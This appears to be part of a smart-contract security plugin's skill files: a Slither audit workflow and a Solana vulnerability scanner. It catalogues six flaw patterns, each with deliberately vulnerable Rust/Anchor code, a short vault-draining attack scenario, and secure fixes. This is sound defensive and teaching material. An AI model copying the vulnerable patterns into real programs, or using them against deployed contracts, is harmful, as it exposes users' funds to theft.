        "plugins/building-secure-contracts/skills/secure-workflow-guide/resources/WORKFLOW_STEPS.md": "## The 5-Step Workflow\n\n### Step 1: Check for Known Security Issues\n\nI'll run Slither with 70+ built-in detectors:\n\n```bash\nslither . --exclude-dependencies\n```\n\nThen I'll:\n- Parse findings by severity\n- Explain each issue with file references\n- Recommend fixes\n- Help you triage false positives\n\n**Goal**: Clean Slither report or documented triages\n\n---\n\n### Step 2: Check Special Features\n\nI'll detect what's applicable and run the right tools:\n\n**If upgradeable contracts**:\n```bash\nslither-check-upgradeability . ContractName --proxy-name ProxyName\n```\nChecks 17 ways upgrades can go wrong\n\n**If ERC tokens (ERC20, ERC721, etc.)**:\n```bash\nslither-check-erc . ContractName --erc erc20\n```\nValidates conformance to 6 common specs\n\n**If Truffle tests exist**:\n```bash\nslither-prop . --contract ContractName\n```\nGenerates security properties for ERC20\n\n**If integrating third-party tokens**:\nI'll recommend using the `token-integration-analyzer` skill\n\n**Note**: I'll only run checks that apply to your codebase\n\n---\n\n### Step 3: Visual Security Inspection\n\nI'll generate 3 security diagrams:\n\n**Inheritance Graph**:\n```bash\nslither . --print inheritance-graph\n```\nIdentifies shadowing and C3 linearization issues\n\n**Function Summary**:\n```bash\nslither . --print function-summary\n```\nShows function visibility and access controls\n\n**Variables and Authorization**:\n```bash\nslither . --print vars-and-auth\n```\nMaps who can write to state variables\n\nI'll review each diagram with you and highlight security concerns\n\n---\n\n### Step 4: Document Security Properties\n\nI'll help you document critical security properties:\n\n**Properties to Define**:\n- **State machine**: Valid transitions, invariants\n- **Access controls**: Who can call what\n- **Arithmetic**: Overflow protection, precision\n- **External interactions**: Reentrancy, failed calls\n- **Standards conformance**: ERC requirements\n\n**Then Set Up Testing**:\n\n**Echidna (fuzzing)**:\n- Create property test contract\n- Define invariants in Solidity\n- Configure echidna.yaml\n- Run fuzzing campaign\n\n**Manticore (formal verification)**:\n- Define properties in Solidity or Python\n- Set up symbolic execution\n- Validate critical paths\n\n**Custom Slither Checks**:\n- Use Slither Python API for project-specific patterns\n- Focus on business logic\n\n**Note**: This is the most important activity for security but requires learning\n\n---\n\n### Step 5: Manual Review Areas\n\nI'll analyze areas automated tools miss:\n\n**Privacy Considerations**:\n- Are secrets stored on-chain?\n- Is commit-reveal needed?\n- Are assumptions about privacy documented?\n\n**Front-Running Risks**:\n- Price-sensitive transactions without slippage protection?\n- Ordering-dependent logic?\n- MEV opportunities?\n\n**Cryptographic Operations**:\n- Weak randomness (block.timestamp, blockhash)?\n- Signature verification issues (ecrecover misuse)?\n- Hash collision vulnerabilities?\n\n**DeFi Interactions**:\n- Oracle manipulation risks?\n- Flash loan attack vectors?\n- Protocol assumption violations?\n\nI'll search your codebase for these patterns and flag risks\n",
        "plugins/building-secure-contracts/skills/solana-vulnerability-scanner/SKILL.md": "---\nname: solana-vulnerability-scanner\ndescription: Scans Solana programs for 6 critical vulnerabilities including arbitrary CPI, improper PDA validation, missing signer/ownership checks, and sysvar spoofing. Use when auditing Solana/Anchor programs.\n---\n\n# Solana Vulnerability Scanner\n\n## 1. Purpose\n\nSystematically scan Solana programs (native and Anchor framework) for platform-specific security vulnerabilities related to cross-program invocations, account validation, and program-derived addresses. This skill encodes 6 critical vulnerability patterns unique to Solana's account model.\n\n## 2. When to Use This Skill\n\n- Auditing Solana programs (native Rust or Anchor)\n- Reviewing cross-program invocation (CPI) logic\n- Validating program-derived address (PDA) implementations\n- Pre-launch security assessment of Solana protocols\n- Reviewing account validation patterns\n- Assessing instruction introspection logic\n\n## 3. Platform Detection\n\n### File Extensions & Indicators\n- **Rust files**: `.rs`\n\n### Language/Framework Markers\n```rust\n// Native Solana program indicators\nuse solana_program::{\n    account_info::AccountInfo,\n    entrypoint,\n    entrypoint::ProgramResult,\n    pubkey::Pubkey,\n    program::invoke,\n    program::invoke_signed,\n};\n\nentrypoint!(process_instruction);\n\n// Anchor framework indicators\nuse anchor_lang::prelude::*;\n\n#[program]\npub mod my_program {\n    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {\n        // Program logic\n    }\n}\n\n#[derive(Accounts)]\npub struct Initialize<'info> {\n    #[account(mut)]\n    pub authority: Signer<'info>,\n}\n\n// Common patterns\nAccountInfo, Pubkey\ninvoke(), invoke_signed()\nSigner<'info>, Account<'info>\n#[account(...)] with constraints\nseeds, bump\n```\n\n### Project Structure\n- `programs/*/src/lib.rs` - Program implementation\n- `Anchor.toml` - Anchor configuration\n- `Cargo.toml` with `solana-program` or `anchor-lang`\n- `tests/` - Program tests\n\n### Tool Support\n- **Trail of Bits Solana Lints**: Rust linters for Solana\n- Installation: Add to Cargo.toml\n- **anchor test**: Built-in testing framework\n- **Solana Test Validator**: Local testing environment\n\n---\n\n## 4. How This Skill Works\n\nWhen invoked, I will:\n\n1. **Search your codebase** for Solana/Anchor programs\n2. **Analyze each program** for the 6 vulnerability patterns\n3. **Report findings** with file references and severity\n4. **Provide fixes** for each identified issue\n5. **Check account validation** and CPI security\n\n---\n\n## 5. Example Output\n\n---\n\n## 5. Vulnerability Patterns (6 Patterns)\n\nI check for 6 critical vulnerability patterns unique to Solana. For detailed detection patterns, code examples, mitigations, and testing strategies, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n\n### Pattern Summary:\n\n1. **Arbitrary CPI**  CRITICAL - User-controlled program IDs in CPI calls\n2. **Improper PDA Validation**  CRITICAL - Using create_program_address without canonical bump\n3. **Missing Ownership Check**  HIGH - Deserializing accounts without owner validation\n4. **Missing Signer Check**  CRITICAL - Authority operations without is_signer check\n5. **Sysvar Account Check**  HIGH - Spoofed sysvar accounts (pre-Solana 1.8.1)\n6. **Improper Instruction Introspection**  MEDIUM - Absolute indexes allowing reuse\n\nFor complete vulnerability patterns with code examples, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n## 5. Scanning Workflow\n\n### Step 1: Platform Identification\n1. Verify Solana program (native or Anchor)\n2. Check Solana version (1.8.1+ for sysvar security)\n3. Locate program source (`programs/*/src/lib.rs`)\n4. Identify framework (native vs Anchor)\n\n### Step 2: CPI Security Review\n```bash\n# Find all CPI calls\nrg \"invoke\\(|invoke_signed\\(\" programs/\n\n# Check for program ID validation before each\n# Should see program ID checks immediately before invoke\n```\n\nFor each CPI:\n- [ ] Program ID validated before invocation\n- [ ] Cannot pass user-controlled program accounts\n- [ ] Anchor: Uses `Program<'info, T>` type\n\n### Step 3: PDA Validation Check\n```bash\n# Find PDA usage\nrg \"find_program_address|create_program_address\" programs/\nrg \"seeds.*bump\" programs/\n\n# Anchor: Check for seeds constraints\nrg \"#\\[account.*seeds\" programs/\n```\n\nFor each PDA:\n- [ ] Uses `find_program_address()` or Anchor `seeds` constraint\n- [ ] Bump seed stored and reused\n- [ ] Not using user-provided bump\n\n### Step 4: Account Validation Sweep\n```bash\n# Find account deserialization\nrg \"try_from_slice|try_deserialize\" programs/\n\n# Should see owner checks before deserialization\nrg \"\\.owner\\s*==|\\.owner\\s*!=\" programs/\n```\n\nFor each account used:\n- [ ] Owner validated before deserialization\n- [ ] Signer check for authority accounts\n- [ ] Anchor: Uses `Account<'info, T>` and `Signer<'info>`\n\n### Step 5: Instruction Introspection Review\n```bash\n# Find instruction introspection usage\nrg \"load_instruction_at|load_current_index|get_instruction_relative\" programs/\n\n# Check for checked versions\nrg \"load_instruction_at_checked|load_current_index_checked\" programs/\n```\n\n- [ ] Using checked functions (Solana 1.8.1+)\n- [ ] Using relative indexing\n- [ ] Proper correlation validation\n\n### Step 6: Trail of Bits Solana Lints\n```toml\n# Add to Cargo.toml\n[dependencies]\nsolana-program = \"1.17\"  # Use latest version\n\n[lints.clippy]\n# Enable Solana-specific lints\n# (Trail of Bits solana-lints if available)\n```\n\n---\n\n## 6. Reporting Format\n\n### Finding Template\n```markdown\n## [CRITICAL] Arbitrary CPI - Unchecked Program ID\n\n**Location**: `programs/vault/src/lib.rs:145-160` (withdraw function)\n\n**Description**:\nThe `withdraw` function performs a CPI to transfer SPL tokens without validating that the provided `token_program` account is actually the SPL Token program. An attacker can provide a malicious program that appears to perform a transfer but actually steals tokens or performs unauthorized actions.\n\n**Vulnerable Code**:\n```rust\n// lib.rs, line 145\npub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {\n    let token_program = &ctx.accounts.token_program;\n\n    // WRONG: No validation of token_program.key()!\n    invoke(\n        &spl_token::instruction::transfer(...),\n        &[\n            ctx.accounts.vault.to_account_info(),\n            ctx.accounts.destination.to_account_info(),\n            ctx.accounts.authority.to_account_info(),\n            token_program.to_account_info(),  // UNVALIDATED\n        ],\n    )?;\n    Ok(())\n}\n```\n\n**Attack Scenario**:\n1. Attacker deploys malicious \"token program\" that logs transfer instruction but doesn't execute it\n2. Attacker calls withdraw() providing malicious program as token_program\n3. Vault's authority signs the transaction\n4. Malicious program receives CPI with vault's signature\n5. Malicious program can now impersonate vault and drain real tokens\n\n**Recommendation**:\nUse Anchor's `Program<'info, Token>` type:\n```rust\nuse anchor_spl::token::{Token, Transfer};\n\n#[derive(Accounts)]\npub struct Withdraw<'info> {\n    #[account(mut)]\n    pub vault: Account<'info, TokenAccount>,\n    #[account(mut)]\n    pub destination: Account<'info, TokenAccount>,\n    pub authority: Signer<'info>,\n    pub token_program: Program<'info, Token>,  // Validates program ID automatically\n}\n\npub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {\n    let cpi_accounts = Transfer {\n        from: ctx.accounts.vault.to_account_info(),\n        to: ctx.accounts.destination.to_account_info(),\n        authority: ctx.accounts.authority.to_account_info(),\n    };\n\n    let cpi_ctx = CpiContext::new(\n        ctx.accounts.token_program.to_account_info(),\n        cpi_accounts,\n    );\n\n    anchor_spl::token::transfer(cpi_ctx, amount)?;\n    Ok(())\n}\n```\n\n**References**:\n- building-secure-contracts/not-so-smart-contracts/solana/arbitrary_cpi\n- Trail of Bits lint: `unchecked-cpi-program-id`\n```\n\n---\n\n## 7. Priority Guidelines\n\n### Critical (Immediate Fix Required)\n- Arbitrary CPI (attacker-controlled program execution)\n- Improper PDA validation (account spoofing)\n- Missing signer check (unauthorized access)\n\n### High (Fix Before Launch)\n- Missing ownership check (fake account data)\n- Sysvar account check (authentication bypass, pre-1.8.1)\n\n### Medium (Address in Audit)\n- Improper instruction introspection (logic bypass)\n\n---\n\n## 8. Testing Recommendations\n\n### Unit Tests\n```rust\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    #[should_panic]\n    fn test_rejects_wrong_program_id() {\n        // Provide wrong program ID, should fail\n    }\n\n    #[test]\n    #[should_panic]\n    fn test_rejects_non_canonical_pda() {\n        // Provide non-canonical bump, should fail\n    }\n\n    #[test]\n    #[should_panic]\n    fn test_requires_signer() {\n        // Call without signature, should fail\n    }\n}\n```\n\n### Integration Tests (Anchor)\n```typescript\nimport * as anchor from \"@coral-xyz/anchor\";\n\ndescribe(\"security tests\", () => {\n  it(\"rejects arbitrary CPI\", async () => {\n    const fakeTokenProgram = anchor.web3.Keypair.generate();\n\n    try {\n      await program.methods\n        .withdraw(amount)\n        .accounts({\n          tokenProgram: fakeTokenProgram.publicKey, // Wrong program\n        })\n        .rpc();\n\n      assert.fail(\"Should have rejected fake program\");\n    } catch (err) {\n      // Expected to fail\n    }\n  });\n});\n```\n\n### Solana Test Validator\n```bash\n# Run local validator for testing\nsolana-test-validator\n\n# Deploy and test program\nanchor test\n```\n\n---\n\n## 9. Additional Resources\n\n- **Building Secure Contracts**: `building-secure-contracts/not-so-smart-contracts/solana/`\n- **Trail of Bits Solana Lints**: https://github.com/trailofbits/solana-lints\n- **Anchor Documentation**: https://www.anchor-lang.com/\n- **Solana Program Library**: https://github.com/solana-labs/solana-program-library\n- **Solana Cookbook**: https://solanacookbook.com/\n\n---\n\n## 10. Quick Reference Checklist\n\nBefore completing Solana program audit:\n\n**CPI Security (CRITICAL)**:\n- [ ] ALL CPI calls validate program ID before `invoke()`\n- [ ] Cannot use user-provided program accounts\n- [ ] Anchor: Uses `Program<'info, T>` type\n\n**PDA Security (CRITICAL)**:\n- [ ] PDAs use `find_program_address()` or Anchor `seeds` constraint\n- [ ] Bump seed stored and reused (not user-provided)\n- [ ] PDA accounts validated against canonical address\n\n**Account Validation (HIGH)**:\n- [ ] ALL accounts check owner before deserialization\n- [ ] Native: Validates `account.owner == expected_program_id`\n- [ ] Anchor: Uses `Account<'info, T>` type\n\n**Signer Validation (CRITICAL)**:\n- [ ] ALL authority accounts check `is_signer`\n- [ ] Native: Validates `account.is_signer == true`\n- [ ] Anchor: Uses `Signer<'info>` type\n\n**Sysvar Security (HIGH)**:\n- [ ] Using Solana 1.8.1+\n- [ ] Using checked functions: `load_instruction_at_checked()`\n- [ ] Sysvar addresses validated\n\n**Instruction Introspection (MEDIUM)**:\n- [ ] Using relative indexes for correlation\n- [ ] Proper validation between related instructions\n- [ ] Cannot reuse same instruction across multiple calls\n\n**Testing**:\n- [ ] Unit tests cover all account validation\n- [ ] Integration tests with malicious inputs\n- [ ] Local validator testing completed\n- [ ] Trail of Bits lints enabled and passing\n",
        "plugins/building-secure-contracts/skills/solana-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md": "### 6.1 ARBITRARY CPI (Cross-Program Invocation)  CRITICAL\n\n**Description**: Using `invoke()` or `invoke_signed()` with user-controlled program IDs allows attackers to call malicious programs instead of the intended program.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: User-provided program ID without validation\npub fn transfer_tokens(\n    ctx: Context<TransferTokens>,\n    amount: u64,\n) -> Result<()> {\n    // User provides token_program account\n    let token_program = &ctx.accounts.token_program;\n\n    // WRONG: No check that token_program.key() == spl_token::ID!\n    invoke(\n        &spl_token::instruction::transfer(...),\n        &[\n            ctx.accounts.from.to_account_info(),\n            ctx.accounts.to.to_account_info(),\n            token_program.to_account_info(),  // ATTACKER CONTROLLED!\n        ],\n    )?;\n    Ok(())\n}\n\n// VULNERABLE: Native Solana without validation\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let token_program = next_account_info(accounts_iter)?;\n\n    // WRONG: No validation of token_program.key\n    invoke(\n        &transfer_instruction,\n        &[from_account, to_account, token_program],  // Unvalidated!\n    )?;\n    Ok(())\n}\n```\n\n**What to Check**:\n- [ ] ALL CPI program IDs validated before `invoke()` or `invoke_signed()`\n- [ ] Validation: `program.key() == EXPECTED_PROGRAM_ID`\n- [ ] Cannot pass arbitrary program accounts from user\n- [ ] Anchor: Use `Program<'info, T>` type with constraint\n\n**Mitigation**:\n```rust\n// SECURE: Validate program ID (Native)\nuse spl_token;\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let token_program = next_account_info(accounts_iter)?;\n\n    // CRITICAL: Validate program ID\n    if token_program.key != &spl_token::ID {\n        return Err(ProgramError::IncorrectProgramId);\n    }\n\n    // Safe to invoke\n    invoke(\n        &spl_token::instruction::transfer(...),\n        &[from_account, to_account, token_program],\n    )?;\n    Ok(())\n}\n\n// SECURE: Use Anchor Program type with constraint\nuse anchor_spl::token::{Token, TokenAccount};\n\n#[derive(Accounts)]\npub struct TransferTokens<'info> {\n    #[account(mut)]\n    pub from: Account<'info, TokenAccount>,\n    #[account(mut)]\n    pub to: Account<'info, TokenAccount>,\n    pub authority: Signer<'info>,\n    // Program<'info, Token> automatically validates program ID\n    pub token_program: Program<'info, Token>,\n}\n\npub fn transfer_tokens(ctx: Context<TransferTokens>, amount: u64) -> Result<()> {\n    // Anchor ensures token_program.key() == Token::id()\n    let cpi_accounts = Transfer {\n        from: ctx.accounts.from.to_account_info(),\n        to: ctx.accounts.to.to_account_info(),\n        authority: ctx.accounts.authority.to_account_info(),\n    };\n\n    let cpi_ctx = CpiContext::new(\n        ctx.accounts.token_program.to_account_info(),\n        cpi_accounts,\n    );\n\n    anchor_spl::token::transfer(cpi_ctx, amount)?;\n    Ok(())\n}\n```\n\n**Tool Detection**:\n- Trail of Bits lint: `unchecked-cpi-program-id`\n- Look for: `invoke()` without prior program ID check\n\n**References**: building-secure-contracts/not-so-smart-contracts/solana/arbitrary_cpi\n\n---\n\n### 4.2 IMPROPER PDA VALIDATION  CRITICAL\n\n**Description**: Program-Derived Addresses (PDAs) can have multiple valid bumps for the same seeds. Using `create_program_address()` without verifying canonical bump allows PDA spoofing attacks.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Using create_program_address without bump validation\npub fn withdraw(ctx: Context<Withdraw>, bump: u8) -> Result<()> {\n    // User provides bump\n    let vault_seeds = &[\n        b\"vault\",\n        ctx.accounts.user.key().as_ref(),\n        &[bump],  // WRONG: Attacker can provide non-canonical bump!\n    ];\n\n    let vault = Pubkey::create_program_address(vault_seeds, ctx.program_id)?;\n\n    // This vault might not be the canonical PDA!\n    // Attacker could create multiple PDAs and drain wrong vault\n    Ok(())\n}\n\n// VULNERABLE: Not comparing with find_program_address result\npub fn initialize(ctx: Context<Initialize>, bump: u8) -> Result<()> {\n    let pda_seeds = &[b\"state\", &[bump]];\n    let pda = Pubkey::create_program_address(pda_seeds, ctx.program_id)?;\n\n    // WRONG: Not verifying this is the canonical PDA\n    // Should check pda == ctx.accounts.pda_account.key()\n}\n```\n\n**What to Check**:\n- [ ] PDAs use `find_program_address()` to get canonical bump\n- [ ] OR `create_program_address()` result compared with expected PDA\n- [ ] Bump seed stored and reused (not provided by user)\n- [ ] Anchor: Use `seeds` and `bump` constraints\n\n**Mitigation**:\n```rust\n// SECURE: Use find_program_address (Native)\npub fn withdraw(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let vault_account = next_account_info(accounts_iter)?;\n    let user_account = next_account_info(accounts_iter)?;\n\n    // Find canonical PDA with bump\n    let (vault_pda, bump) = Pubkey::find_program_address(\n        &[b\"vault\", user_account.key.as_ref()],\n        program_id,\n    );\n\n    // Verify provided account matches canonical PDA\n    if vault_account.key != &vault_pda {\n        return Err(ProgramError::InvalidAccountData);\n    }\n\n    // Use bump for signing\n    let vault_seeds = &[\n        b\"vault\",\n        user_account.key.as_ref(),\n        &[bump],\n    ];\n\n    invoke_signed(\n        &transfer_instruction,\n        &[vault_account, destination],\n        &[vault_seeds],\n    )?;\n\n    Ok(())\n}\n\n// SECURE: Anchor with seeds constraint\n#[derive(Accounts)]\npub struct Withdraw<'info> {\n    #[account(\n        mut,\n        seeds = [b\"vault\", user.key().as_ref()],\n        bump,  // Anchor automatically validates canonical bump\n    )]\n    pub vault: Account<'info, VaultAccount>,\n\n    pub user: Signer<'info>,\n}\n\npub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {\n    // Anchor has already validated vault is canonical PDA\n    let bump = *ctx.bumps.get(\"vault\").unwrap();\n\n    let vault_seeds = &[\n        b\"vault\",\n        ctx.accounts.user.key().as_ref(),\n        &[bump],\n    ];\n\n    // Safe to use in CPI\n    let signer_seeds = &[&vault_seeds[..]];\n\n    // CPI with PDA signer\n    Ok(())\n}\n\n// BETTER: Store bump in account\n#[account]\npub struct VaultAccount {\n    pub bump: u8,  // Store canonical bump\n    pub owner: Pubkey,\n    pub balance: u64,\n}\n\n#[derive(Accounts)]\npub struct Initialize<'info> {\n    #[account(\n        init,\n        payer = user,\n        space = 8 + 1 + 32 + 8,\n        seeds = [b\"vault\", user.key().as_ref()],\n        bump,\n    )]\n    pub vault: Account<'info, VaultAccount>,\n\n    #[account(mut)]\n    pub user: Signer<'info>,\n    pub system_program: Program<'info, System>,\n}\n\npub fn initialize(ctx: Context<Initialize>) -> Result<()> {\n    let vault = &mut ctx.accounts.vault;\n    vault.bump = *ctx.bumps.get(\"vault\").unwrap();  // Store canonical bump\n    vault.owner = ctx.accounts.user.key();\n    vault.balance = 0;\n    Ok(())\n}\n```\n\n**Tool Detection**:\n- Trail of Bits lint: `improper-pda-validation`\n- Look for: `create_program_address` without `find_program_address` comparison\n\n**References**: building-secure-contracts/not-so-smart-contracts/solana/pda_validation\n\n---\n\n### 4.3 MISSING OWNERSHIP CHECK  HIGH\n\n**Description**: Accounts without owner validation can be spoofed by attackers. User provides account with attacker-controlled data, bypassing program logic.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Deserializing account without owner check\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let vault_account = next_account_info(accounts_iter)?;\n\n    // WRONG: No owner check before deserializing!\n    let vault: Vault = Vault::try_from_slice(&vault_account.data.borrow())?;\n\n    // vault could be fake account owned by attacker with fake balance!\n    if vault.balance >= amount {\n        // Process withdrawal using fake balance\n    }\n\n    Ok(())\n}\n\n// VULNERABLE: Anchor without owner constraint\n#[derive(Accounts)]\npub struct Withdraw<'info> {\n    /// CHECK: This is unsafe - no owner validation!\n    pub vault: AccountInfo<'info>,\n}\n```\n\n**What to Check**:\n- [ ] ALL accounts validated for correct owner before deserialization\n- [ ] Native: Check `account.owner == expected_program_id`\n- [ ] Anchor: Use `Account<'info, T>` type (automatic owner check)\n- [ ] System accounts: Check `account.owner == system_program::ID`\n- [ ] Token accounts: Check `account.owner == spl_token::ID`\n\n**Mitigation**:\n```rust\n// SECURE: Validate owner before deserializing (Native)\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let vault_account = next_account_info(accounts_iter)?;\n\n    // CRITICAL: Validate owner\n    if vault_account.owner != program_id {\n        return Err(ProgramError::IncorrectProgramId);\n    }\n\n    // Safe to deserialize - we own this account\n    let vault: Vault = Vault::try_from_slice(&vault_account.data.borrow())?;\n\n    Ok(())\n}\n\n// SECURE: Use Anchor Account type (automatic validation)\n#[derive(Accounts)]\npub struct Withdraw<'info> {\n    #[account(mut)]\n    pub vault: Account<'info, VaultAccount>,  // Anchor checks owner automatically\n    pub user: Signer<'info>,\n}\n\n// For third-party program accounts\n#[derive(Accounts)]\npub struct ProcessToken<'info> {\n    #[account(mut)]\n    pub token_account: Account<'info, TokenAccount>,  // Validates owner == Token program\n    pub token_program: Program<'info, Token>,\n}\n```\n\n**Tool Detection**:\n- Trail of Bits lint: `missing-ownership-check`\n- Look for: Deserialization without owner validation\n\n**References**: building-secure-contracts/not-so-smart-contracts/solana/ownership_check\n\n---\n\n### 4.4 MISSING SIGNER CHECK  CRITICAL\n\n**Description**: Sensitive operations without `is_signer` validation allow unauthorized users to call functions intended for specific authorities.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: No signer check on authority account\npub fn withdraw(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    amount: u64,\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let vault = next_account_info(accounts_iter)?;\n    let authority = next_account_info(accounts_iter)?;\n\n    // WRONG: No check that authority.is_signer == true!\n    // Attacker can provide any authority account and withdraw\n\n    let vault_data: Vault = Vault::try_from_slice(&vault.data.borrow())?;\n\n    // Check authority matches (but attacker provided this!)\n    if vault_data.authority != *authority.key {\n        return Err(ProgramError::InvalidAccountData);\n    }\n\n    // Process withdrawal - ATTACKER CAN CALL THIS!\n    Ok(())\n}\n\n// VULNERABLE: Anchor without Signer type\n#[derive(Accounts)]\npub struct Withdraw<'info> {\n    #[account(mut)]\n    pub vault: Account<'info, VaultAccount>,\n    /// CHECK: Missing signer constraint!\n    pub authority: AccountInfo<'info>,\n}\n```\n\n**What to Check**:\n- [ ] ALL authority accounts validated with `is_signer`\n- [ ] Native: Check `account.is_signer == true`\n- [ ] Anchor: Use `Signer<'info>` type (automatic validation)\n- [ ] Access-controlled functions require signer check\n\n**Mitigation**:\n```rust\n// SECURE: Check is_signer (Native)\npub fn withdraw(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    amount: u64,\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let vault = next_account_info(accounts_iter)?;\n    let authority = next_account_info(accounts_iter)?;\n\n    // CRITICAL: Verify authority signed the transaction\n    if !authority.is_signer {\n        return Err(ProgramError::MissingRequiredSignature);\n    }\n\n    let vault_data: Vault = Vault::try_from_slice(&vault.data.borrow())?;\n\n    // Now safe to check authority matches\n    if vault_data.authority != *authority.key {\n        return Err(ProgramError::InvalidAccountData);\n    }\n\n    // Process withdrawal - only if authority signed\n    Ok(())\n}\n\n// SECURE: Use Anchor Signer type (automatic validation)\n#[derive(Accounts)]\npub struct Withdraw<'info> {\n    #[account(\n        mut,\n        has_one = authority,  // Also validate vault.authority == authority.key()\n    )]\n    pub vault: Account<'info, VaultAccount>,\n    pub authority: Signer<'info>,  // Anchor checks is_signer automatically\n}\n\npub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {\n    // Anchor has already validated:\n    // 1. authority.is_signer == true\n    // 2. vault.authority == authority.key()\n\n    // Safe to proceed with withdrawal\n    Ok(())\n}\n\n// For admin functions\n#[derive(Accounts)]\npub struct UpdateConfig<'info> {\n    #[account(\n        mut,\n        has_one = admin,\n    )]\n    pub config: Account<'info, Config>,\n    pub admin: Signer<'info>,  // Must be signer\n}\n```\n\n**Tool Detection**:\n- Trail of Bits lint: `missing-signer-check`\n- Look for: Authority checks without `is_signer` validation\n\n**References**: building-secure-contracts/not-so-smart-contracts/solana/signer_check\n\n---\n\n### 4.5 SYSVAR ACCOUNT CHECK  HIGH (Pre-Solana 1.8.1)\n\n**Description**: In Solana versions before 1.8.1, users can pass spoofed sysvar accounts (Instructions, Clock, etc.) to bypass authentication. This affects `load_instruction_at()` and similar functions.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Using unchecked load functions (Solana < 1.8.1)\nuse solana_program::sysvar::instructions;\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let instructions_sysvar = next_account_info(accounts_iter)?;\n\n    // WRONG: load_instruction_at() doesn't validate sysvar account!\n    let current_ix = instructions::load_instruction_at(0, instructions_sysvar)?;\n\n    // Attacker can provide fake Instructions sysvar with spoofed instruction data!\n    // Bypass authentication by faking previous instruction\n}\n\n// VULNERABLE: load_current_index() without validation\nlet current_index = instructions::load_current_index(instructions_sysvar)?;\n```\n\n**What to Check**:\n- [ ] Using Solana 1.8.1 or higher\n- [ ] Using checked functions: `load_instruction_at_checked()`, `load_current_index_checked()`\n- [ ] NOT using: `load_instruction_at()`, `load_current_index()` (unchecked versions)\n- [ ] Sysvar accounts validated against known addresses\n\n**Mitigation**:\n```rust\n// OPTION 1: Upgrade to Solana 1.8.1+ and use checked functions\nuse solana_program::sysvar::instructions;\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let instructions_sysvar = next_account_info(accounts_iter)?;\n\n    // SECURE: load_instruction_at_checked validates sysvar account\n    let current_ix = instructions::load_instruction_at_checked(\n        0,\n        instructions_sysvar\n    )?;\n\n    // Safe - sysvar is validated\n    Ok(())\n}\n\n// OPTION 2: Manual validation (if on old Solana version)\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n    let instructions_sysvar = next_account_info(accounts_iter)?;\n\n    // Validate sysvar account address\n    if instructions_sysvar.key != &solana_program::sysvar::instructions::ID {\n        return Err(ProgramError::InvalidAccountData);\n    }\n\n    // Now safe to use unchecked function\n    let current_ix = instructions::load_instruction_at(0, instructions_sysvar)?;\n\n    Ok(())\n}\n\n// SECURE: Anchor with address constraint\n#[derive(Accounts)]\npub struct CheckInstructions<'info> {\n    /// CHECK: Validated against known sysvar address\n    #[account(address = solana_program::sysvar::instructions::ID)]\n    pub instructions_sysvar: AccountInfo<'info>,\n}\n```\n\n**Tool Detection**:\n- Trail of Bits lint: `unchecked-sysvar-account`\n- Look for: `load_instruction_at()` instead of `load_instruction_at_checked()`\n\n**References**: building-secure-contracts/not-so-smart-contracts/solana/sysvar_get\n\n---\n\n### 4.6 IMPROPER INSTRUCTION INTROSPECTION  MEDIUM\n\n**Description**: Using absolute indexes in instruction introspection allows reusing the same instruction context across multiple program calls. Should use relative indexes to ensure proper correlation.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Absolute index in load_instruction_at\nuse solana_program::sysvar::instructions;\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let instructions_sysvar = &accounts[0];\n\n    // WRONG: Using absolute index 0\n    let prev_ix = instructions::load_instruction_at_checked(0, instructions_sysvar)?;\n\n    // Attacker can craft transaction where instruction 0 is benign,\n    // but instruction 1 (malicious) also loads instruction 0 for validation\n    // Same instruction 0 used to validate both instruction 0 and 1!\n}\n\n// VULNERABLE: No correlation between instructions\npub fn withdraw(ctx: Context<Withdraw>) -> Result<()> {\n    let instructions_sysvar = &ctx.accounts.instructions_sysvar;\n\n    // Check that previous instruction was deposit\n    let prev_ix = instructions::load_instruction_at_checked(0, instructions_sysvar)?;\n\n    // WRONG: Not checking that prev_ix is actually related to current instruction\n    // Could be completely unrelated instruction from earlier in transaction\n}\n```\n\n**What to Check**:\n- [ ] Use relative indexes: `get_instruction_relative(-1, ...)` for previous 